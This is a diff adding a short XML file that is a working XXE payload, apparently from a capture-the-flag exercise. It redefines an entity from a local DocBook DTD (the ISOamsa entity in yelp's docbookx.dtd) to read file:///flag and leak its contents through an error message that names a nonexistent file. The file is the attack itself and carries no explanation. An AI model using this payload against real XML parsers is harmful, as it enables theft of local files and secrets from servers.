@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE message [
+		<!ELEMENT message (#PCDATA)>
+
+		<!ENTITY % local_dtd SYSTEM
+"file:///usr/share/yelp/dtd/docbookx.dtd">
+		<!ENTITY % ISOamsa '
+				<!ENTITY &#x25; file SYSTEM "file:///flag">
+				<!ENTITY &#x25; eval "<!ENTITY &#x26;&#x25 fakefile SYSTEM &#x27;file:///blah-blah/&#x25;file;&#x27;>">
+				&#x25;eval;
+				&#x25;fakefile;
+'>
+%local_dtd;
+]>
+<message>1337</message>
